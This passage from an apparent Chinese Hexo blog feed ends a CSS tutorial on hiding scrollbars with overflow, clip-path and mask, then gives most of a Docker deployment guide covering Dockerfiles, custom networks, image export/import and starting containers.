class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后，将列表底部<strong>padding</strong>设置的稍微大一些，比如</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span>&#123;</span><br><span class="line">  <span class="comment">/**/</span></span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到列表下方的距离变大了，滚动条也更靠下了，效果如下<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656490003-f7ba30f1-d180-45d6-b335-26639093f91e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656490003-f7ba30f1-d180-45d6-b335-26639093f91e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />如何让整体尺寸仍然保持原有呢？答案是借助负<strong>「margin」</strong>，比如之前底部<strong>「padding」</strong>是<strong>10</strong>，现在改成了<strong>20</strong>，所以需要**-10<strong>的</strong>「margin」**</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span>&#123;</span><br><span class="line">  <span class="comment">/**/</span></span><br><span class="line">  <span class="attribute">margin-bottom</span>: -<span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样整体尺寸就正常了，不过滚动条仍然是可见的，只是出去了<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656624290-37cfcc4c-c57d-4e9c-ba26-e2b6535b8a92.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656624290-37cfcc4c-c57d-4e9c-ba26-e2b6535b8a92.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />最后只需要设置父级的 <strong>「overflow」</strong>为隐藏就可以了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrap</span>&#123;</span><br><span class="line">  <span class="comment">/**/</span></span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理示意如下<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656683654-96a79817-e7e8-4a15-86fa-1507f503d83b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656683654-96a79817-e7e8-4a15-86fa-1507f503d83b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />当然，不仅仅是 <strong>「overflow」</strong>，下面这种方式也可以实现超出隐藏</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrap</span>&#123;</span><br><span class="line">  <span class="comment">/**/</span></span><br><span class="line">  <span class="attribute">contain</span>: paint;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个属性比较新，可以控制元素在容器内的绘制规则，了解一下即可<br /><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/contain">https://developer.mozilla.org/zh-CN/docs/Web/CSS/contain</a></strong><br><a name="ARsR5"></a></p><h2 id="二、通过-clip-裁剪"><a href="#二、通过-clip-裁剪" class="headerlink" title="二、通过 clip 裁剪"></a>二、通过 clip 裁剪</h2><p>第一种方式需要借助父级的超出隐藏，需要额外一层，好像有点麻烦，有没有办法自身也可以裁剪呢？<br />那就是 <strong>「clip-path」</strong><br /><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/clip-path">https://developer.mozilla.org/zh-CN/docs/Web/CSS/clip-path</a></strong><br />相信大家对这个属性应该很熟练了，非常直观的裁剪属性。<br />比如这种情况，只需要把滚动条的那一部分裁剪掉就可以了，这里要用到<strong>clip-path</strong>的<strong>inset</strong>方法</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">clip-path</span>: <span class="built_in">inset</span>()</span><br></pre></td></tr></table></figure><p>这里简单介绍一下。<strong>「inset」</strong>最多可以传 4 个参数，分别表示裁剪掉距离上、右、下、左的部分<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656805236-132c257a-6b8a-48a2-aca0-e08f58dc50e5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656805236-132c257a-6b8a-48a2-aca0-e08f58dc50e5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />所以，要把滚动条隐藏就很简单了，只需要把下方的裁剪距离设置大于滚动条尺寸的值就行了，这里就用<strong>10px</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.list&#123;</span><br><span class="line">  clip-path: inset(0 0 10px)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656884289-b0a6ca3d-52f2-41b6-91af-5a610ac05251.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717656884289-b0a6ca3d-52f2-41b6-91af-5a610ac05251.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />一行代码轻松解决~</p><p><a name="Zjhlu"></a></p><h2 id="三、通过-mask-遮罩"><a href="#三、通过-mask-遮罩" class="headerlink" title="三、通过 mask 遮罩"></a>三、通过 mask 遮罩</h2><p>其实和 <strong>「clip」</strong>思路是一致的，只不过实现方式不一样。<br />关于 <a href="http://mp.weixin.qq.com/s?__biz=MzIyMDc1NTYxNg==&mid=2247488049&idx=1&sn=dfa9e190e4828c5bf6cf8287ecaa471f&chksm=97c671fea0b1f8e86a74fd50f2825ae38a5e45ba71142a0961f743d9bdcde24caaa51daef2b7&scene=21#wechat_redirect">mask 遮罩</a>，之前在多篇文章中都有提到，非常实用的小技巧，主要原理是显示遮罩图片不透明的部分，透明的则会被裁剪，示意如下<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/jpeg/300943/1717657000032-93897e02-8c6e-4a5c-a13f-d85ebe698187.jpeg" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/jpeg/300943/1717657000032-93897e02-8c6e-4a5c-a13f-d85ebe698187.jpeg" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />回到这里，我们只需要绘制一个不包含滚动条部分的纯色渐变就行了，可以直接绘制一个纯色渐变，然后设置背景尺寸，如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span>&#123;</span><br><span class="line">  -webkit-<span class="attribute">mask</span>: <span class="built_in">linear-gradient</span>(red, red) <span class="number">0</span> <span class="number">0</span>/<span class="number">100%</span> <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">10px</span>) no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理示意如下<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/jpeg/300943/1717657042786-dd34340c-5195-4d92-bfbf-bcf1a53fb182.jpeg" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/jpeg/300943/1717657042786-dd34340c-5195-4d92-bfbf-bcf1a53fb182.jpeg" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />除此以外，mask 还可以很好的实现滚动边界渐隐的效果，只需要叠加一层从<strong>透明 → 纯色 → 透明</strong>的渐变就行了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span>&#123;</span><br><span class="line">  -webkit-<span class="attribute">mask</span>: <span class="built_in">linear-gradient</span>(to right, transparent, red <span class="number">15px</span> <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">15px</span>), transparent),</span><br><span class="line">    <span class="built_in">linear-gradient</span>(red, red) <span class="number">0</span> <span class="number">0</span>/<span class="number">100%</span> <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">10px</span>) no-repeat;</span><br><span class="line">  -webkit-<span class="attribute">mask-composite</span>: source-in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以得到这样的效果<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/gif/1548284/1705027841478-8ab146cd-8707-4a99-bc8b-448e08854030.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/gif/1548284/1705027841478-8ab146cd-8707-4a99-bc8b-448e08854030.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />以上所有完整 demo 可以查看以下链接</p><ul><li><strong>CSS scroll hidden (juejin.cn)[1]</strong></li><li><strong>CSS scroll hidden (codepen.io)[2]</strong><br><a name="eA9M0"></a></li></ul><h2 id="四、总结一下"><a href="#四、总结一下" class="headerlink" title="四、总结一下"></a>四、总结一下</h2><p>以上共介绍了 3 种方式来隐藏滚动条，各有千秋</p><ol><li><strong>「overflow」</strong>兼容性最好，也最直观，符合大多数人思路，缺点是需要单独嵌套一层父级</li><li><strong>「clip」</strong>实现最简洁，也比较好理解，在本案例中最为推荐</li><li><strong>「mask」</strong>思路和<strong>「clip」</strong>，实现起来稍微复杂一点，还可以实现更为复杂的渐隐效果，能够掌握更好</li></ol><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 兼容 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 兼容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何使用 Docker 提升开发及部署体验</title>
      <link href="/2024/05/12/frontend/engineering/ru-he-shi-yong-docker-ti-sheng-kai-fa-ji-bu-shu-ti-yan/"/>
      <url>/2024/05/12/frontend/engineering/ru-he-shi-yong-docker-ti-sheng-kai-fa-ji-bu-shu-ti-yan/</url>
      
        <content type="html"><![CDATA[<p><a name="CshLW"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>某些项目在进行私有化部署的时候遇到了一些问题：</p><ol><li>内网隔离环境，一些 npm 包需要先下载到 u 盘再拷贝到对应的机器上进行安装，安装起来很麻烦。</li><li>测试环境下，代码和机器配置调试好了，部署到线上机器的时候却出现了问题。</li><li>线上机器迁移的时候，又需要在新的机器上进行机器配置了调试，等于又把之前要做的事情重来一遍。</li><li>在有部署文档的情况下交给其他人去给不同的用户部署的时候，自己还需要一直盯着，不然出问题了其他人也不一定能解决。比如说在这个机器上有些依赖装不上等问题。自己深陷其中，无法自拔。</li></ol><p><br />那么面对这些问题，有没有办法可以解决呢？<br />答案是：使用 Docker 容器部署。</p><p><a name="Uiq1R"></a></p><h1 id="什么是-Docker"><a href="#什么是-Docker" class="headerlink" title="什么是 Docker?"></a>什么是 Docker?</h1><p>Docker 容器技术是一种轻量级的虚拟化解决方案，它通过将应用程序及其依赖项打包在一个独立的容器中，实现了应用程序的跨平台部署。Docker 容器技术具有以下特点：</p><ol><li>轻量级：Docker 容器技术无需额外的虚拟化层，因此具有较低的资源开销。</li><li>可移植性：Docker 容器可以将应用程序及其依赖项打包在一起，实现跨平台的部署。</li><li>隔离性：Docker 容器之间相互隔离，保证了应用程序的安全性和稳定性。</li><li>版本控制：Docker 容器可以使用版本控制系统进行管理，便于追踪和回滚。</li></ol><p><a name="pI8xI"></a></p><h1 id="使用-Docker-有什么好处？"><a href="#使用-Docker-有什么好处？" class="headerlink" title="使用 Docker 有什么好处？"></a>使用 Docker 有什么好处？</h1><p>在有 Docker 的环境中，可以将你的镜像放到其中运行，只需要简单的几行命令，你的项目就可以跑起来了。而且可以保证同个镜像的内置环境是一样的，避免了类似测试环境可以到线上环境就不行的情况。<br><a name="e85zJ"></a></p><h2 id="一、传统的项目私有化部署方式"><a href="#一、传统的项目私有化部署方式" class="headerlink" title="一、传统的项目私有化部署方式"></a>一、传统的项目私有化部署方式</h2><p><a name="J2l8x"></a></p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><ul><li>服务器</li><li>nignx 配置</li><li>build&#x3D;&gt; 产物，放入指定文件夹</li><li>启动 node 服务<br><a name="dCebk"></a></li></ul><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><ul><li>服务器</li><li>nignx 配置</li><li>build&#x3D;&gt; 产物，放入指定文件夹<br><a name="leF5Q"></a></li></ul><h3 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h3><ol><li>部署的人需要对前端有一定的了解</li><li>裸机，局域网，部署的耗时都比较长</li><li>迁移的时候容易出错</li><li>需要进行新的私有化部署时还得重来一次</li></ol><p><a name="WEQPU"></a></p><h2 id="二、使用-Docker-容器部署"><a href="#二、使用-Docker-容器部署" class="headerlink" title="二、使用 Docker 容器部署"></a>二、使用 Docker 容器部署</h2><ol><li>提供产物从数量上来看变少，只用提供镜像即可。</li><li>迁移方便部署人不需要关心镜像内部逻辑，前端人员可以解放出来。</li><li>降低出错率。</li></ol><p><a name="V3Dzn"></a></p><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>这里简要地介绍一些概念，不会太深入，有需要的同学可以自行研究。</p><p><a name="EhwVU"></a></p><h2 id="一、镜像"><a href="#一、镜像" class="headerlink" title="一、镜像"></a>一、镜像</h2><p>Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。启动一个容器，需要先有一个镜像。</p><p><a name="Wcb0d"></a></p><h2 id="二、容器"><a href="#二、容器" class="headerlink" title="二、容器"></a>二、容器</h2><p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。<br />容器正常启动之后，就相当于你的项目跑起来了。</p><p><a name="WVgvx"></a></p><h2 id="三、镜像仓库"><a href="#三、镜像仓库" class="headerlink" title="三、镜像仓库"></a>三、镜像仓库</h2><p>仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。类似 npm 包仓库一样，你可以从上面下载其他人上传的镜像，或者上传自己的镜像供其他人使用。</p><p><a name="NMVcd"></a></p><h1 id="如何使用-Docker-容器来部署项目呢？"><a href="#如何使用-Docker-容器来部署项目呢？" class="headerlink" title="如何使用 Docker 容器来部署项目呢？"></a>如何使用 Docker 容器来部署项目呢？</h1><p><a name="xYmJU"></a></p><h2 id="一、制作镜像"><a href="#一、制作镜像" class="headerlink" title="一、制作镜像"></a>一、制作镜像</h2><p>Dockerfile 是一个文本文件，其内包含了一条条的 指令（Instruction），每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。<br />一个很简单的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM node:lts-alpine AS builder</span><br><span class="line">WORKDIR /home/node/app</span><br><span class="line">COPY front .</span><br><span class="line">COPY .yarnrc .</span><br><span class="line">RUN yarn --registry=https://registry.npm.taobao.org &amp;&amp; yarn build</span><br><span class="line"></span><br><span class="line">FROM nginx:stable-alpine</span><br><span class="line">WORKDIR /usr/share/nginx/html</span><br><span class="line">COPY --from=builder /home/node/app/dist .</span><br><span class="line">COPY front/nginx.conf /etc/nginx/conf.d/default.conf</span><br><span class="line">COPY front/ssl /etc/nginx/ssl</span><br><span class="line">EXPOSE 80 443</span><br></pre></td></tr></table></figure><p><a name="UkyBo"></a></p><h3 id="FROM-指定基础镜像"><a href="#FROM-指定基础镜像" class="headerlink" title="FROM 指定基础镜像"></a>FROM 指定基础镜像</h3><p>所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。就比如说我们的项目依赖于 node 环境，那么我们可以基于一个 node 镜像，再进行修改，基础镜像是必须指定的。而 FROM 就是指定基础镜像，因此一个 Dockerfile 中 FROM 是必备的指令，并且必须是第一条指令。<br><a name="CnHWT"></a></p><h3 id="RUN-执行命令"><a href="#RUN-执行命令" class="headerlink" title="RUN 执行命令"></a>RUN 执行命令</h3><p>RUN 指令是用来执行命令行命令的。由于命令行的强大能力，RUN 指令在定制镜像时是最常用的指令之一，其格式有两种：</p><ul><li>shell 格式：RUN &lt;命令&gt;，就像直接在命令行中输入的命令一样。刚才写的 Dockerfile 中的 RUN 指令就是这种格式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN echo &#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27; &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure><ul><li>exec 格式：RUN [“可执行文件”, “参数 1”, “参数 2”]，这更像是函数调用中的格式。<br />就比如说我们需要去复制文件，安装依赖等。<br><a name="WcRVm"></a></li></ul><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>在 Dockerfile 文件所在目录执行：$ docker build -t nginx:v3 .<br />这里我们使用了 docker build 命令进行镜像构建。其格式为：<br />构建完成之后，咱们就可以通过镜像来启动容器了，也就是把咱们的项目跑起来。</p><p><a name="dCNum"></a></p><h2 id="二、Docker-容器之间的互连"><a href="#二、Docker-容器之间的互连" class="headerlink" title="二、Docker 容器之间的互连"></a>二、Docker 容器之间的互连</h2><p>容器启动起来之后，咱们发现访问前端容器里的页面，接口请求 404 了。无法正确访问到服务端的容器上。这是为什么呢？因为每个容器是相互隔离的，容器内部的网络环境也是独立的，所以容器 test1 通过 127.0.0.1+端口号是无法直接访问到容器 test2 里的。这时候该怎么办呢？可以使用自定义的 Docker 网络来连接多个容器</p><p>随着 Docker 网络的完善，强烈建议大家将容器加入自定义的 Docker 网络来连接多个容器，而不是使用–link 参数。<br><a name="syf7r"></a></p><h3 id="新建网络"><a href="#新建网络" class="headerlink" title="新建网络"></a>新建网络</h3><p>下面先创建一个新的 Docker 网络。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker network create -d bridge my-net</span><br></pre></td></tr></table></figure><p>-d 参数指定 Docker 网络类型，有 bridge overlay。其中 overlay 网络类型用于 Swarm mode。<br><a name="nDJxj"></a></p><h3 id="连接容器"><a href="#连接容器" class="headerlink" title="连接容器"></a>连接容器</h3><p>运行一个容器并连接到新建的 my-net 网络</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it --rm --name busybox1 --network my-net busybox sh</span><br></pre></td></tr></table></figure><p>打开新的终端，再运行一个容器并加入到 my-net 网络</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it --rm --name busybox2 --network my-net busybox sh</span><br></pre></td></tr></table></figure><p>再打开一个新的终端查看容器信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker container ls</span><br><span class="line"></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">b47060aca56b        busybox             &quot;sh&quot;                11 minutes ago      Up 11 minutes                           busybox2</span><br><span class="line">8720575823ec        busybox             &quot;sh&quot;                16 minutes ago      Up 16 minutes                           busybox1</span><br></pre></td></tr></table></figure><p>下面通过 ping 来证明 busybox1 容器和 busybox2 容器建立了互联关系。在 busybox1 容器输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # ping busybox2</span><br><span class="line">PING busybox2 (172.19.0.3): 56 data bytes</span><br><span class="line">64 bytes from 172.19.0.3: seq=0 ttl=64 time=0.072 ms</span><br><span class="line">64 bytes from 172.19.0.3: seq=1 ttl=64 time=0.118 ms</span><br></pre></td></tr></table></figure><p>用 ping 来测试连接 busybox2 容器，它会解析成 172.19.0.3。同理在 busybox2 容器执行 ping busybox1，也会成功连接到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # ping busybox1</span><br><span class="line">PING busybox1 (172.19.0.2): 56 data bytes</span><br><span class="line">64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.064 ms</span><br><span class="line">64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.143 ms</span><br></pre></td></tr></table></figure><p>这样，busybox1 容器和 busybox2 容器建立了互联关系。<br><a name="Pe8Yl"></a></p><h2 id="三、导出镜像"><a href="#三、导出镜像" class="headerlink" title="三、导出镜像"></a>三、导出镜像</h2><p>通过 使用自定义 Docker 网络，咱们可以实现 Docker 容器之间的互联了。<br />咱们在自己的机器上调通之后，怎么在其他的机器上进行部署呢？</p><ol><li>如果在公司内部有私有的 Docker 镜像仓库，我们可以把构建好的镜像上传至私有仓库，然后再从测试&#x2F;线上的机器拉取对应的镜像即可，启动容器即可。</li><li>在没有私有的 Docker 镜像仓库的情况下，可以将咱们的镜像进行导出，导出之后再拷贝到目标的机器上进行导入，然后启动容器。</li></ol><p><a name="ArHby"></a></p><h3 id="如何导出镜像"><a href="#如何导出镜像" class="headerlink" title="如何导出镜像"></a>如何导出镜像</h3><p>一、docker save 是用来将一个或多个 image 打包保存的工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o images.tar postgres:9.6  mongo:3.4</span><br></pre></td></tr></table></figure><p>二、docker export 是用来将 container 的文件系统进行打包的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export  -o postgres-export.tar postgres</span><br></pre></td></tr></table></figure><p>两者之间有什么区别呢：</p><ul><li>docker save 保存的是镜像（image），docker export 保存的是容器（container）；</li><li>docker load 用来载入镜像包，docker import 用来载入容器包，但两者都会恢复为镜像；*docker load 不能对载入的镜像重命名，而 docker import 可以为镜像指定新名称。</li></ul><p>docker save 的应用场景是，如果你的应用是使用 docker-compose.yml 编排的多个镜像组合，但你要部署的客户服务器并不能连外网。这时，你可以使用 docker save 将用到的镜像打个包，然后拷贝到客户服务器上使用 docker load 载入。</p><p>docker export 的应用场景主要用来制作基础镜像，比如你从一个 ubuntu 镜像启动一个容器，然后安装一些软件和进行一些设置后，使用 docker export 保存为一个基础镜像。然后，把这个镜像分发给其他人使用，比如作为基础的开发环境。</p><p><a name="zxt8H"></a></p><h2 id="四、导入镜像"><a href="#四、导入镜像" class="headerlink" title="四、导入镜像"></a>四、导入镜像</h2><p><br />一、使用 docker import 命令则可将这个镜像文件导入进来（跟 docker export 配对使用）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import /path/to/latest.tar</span><br></pre></td></tr></table></figure><p>二、使用 docker load 命令则可将这个镜像文件载入进来（跟 docker save 配对使用）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i /path/to/fedora-latest.tar</span><br></pre></td></tr></table></figure><p><a name="HkiDg"></a></p><h2 id="五、启动容器"><a href="#五、启动容器" class="headerlink" title="五、启动容器"></a>五、启动容器</h2><p><br />假设我们已经导入了服务端镜像 my-server 以及前端镜像 my-front，我们该如何启动呢？<br />首先我们需要先创建一个网络，让容器具备互联的基础：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network create -d bridge my-net</span><br></pre></td></tr></table></figure><p>然后，分别启动一下我们的服务端和前端容器。</p><ul><li>服务端启动：docker run -d -p 8360:8360 –network my-net –network-alias myserver my-server</li><li>web 端启动 docker run -d -p 8080:80 –network my-net –network-alias myfront my-front</li></ul><p><a name="b7zIB"></a></p><h1 id="真实场景下的部署体验感觉"><a href="#真实场景下的部署体验感觉" class="headerlink" title="真实场景下的部署体验感觉"></a>真实场景下的部署体验感觉</h1><p><a name="SYXBI"></a></p><h2 id="一、传统模式下的部署"><a href="#一、传统模式下的部署" class="headerlink" title="一、传统模式下的部署"></a>一、传统模式下的部署</h2><p><br />传统的部署模式下，我们需要挨个去安装各种各样的环境：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/1548284/1710208051388-a874e66d-3e92-4cd8-9bb6-8d09ffe531d0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/1548284/1710208051388-a874e66d-3e92-4cd8-9bb6-8d09ffe531d0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>安装完成之后，再拷贝相关的代码以及配置文件到目标的机器上：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/1548284/1710208051397-3c63fdec-f495-4013-bf5f-5be5ae48a2e8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/1548284/1710208051397-3c63fdec-f495-4013-bf5f-5be5ae48a2e8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="hOJtA"></a></p><h2 id="二、使用-Docker-改造之后的部署"><a href="#二、使用-Docker-改造之后的部署" class="headerlink" title="二、使用 Docker 改造之后的部署"></a>二、使用 Docker 改造之后的部署</h2><ol><li>安装 docker 环境</li><li>创建 docker 网络：<code>sudo docker network create -d bridge my-net</code></li><li>上传镜像文件（my-front.tar、my-server.tar）至服务器</li><li>导入镜像：<code>sudo docker load -i my-front.tar</code>、<code>sudo docker load -i my-server.tar</code></li><li>启动服务端容器：<code>docker run -d -p 8360:8360 --network wenjuan-net --network-alias myserver my-server</code></li><li>启动系统前端容器：<code>sudo docker run -d -p 8080:80 --network my-net --network-alias myfront 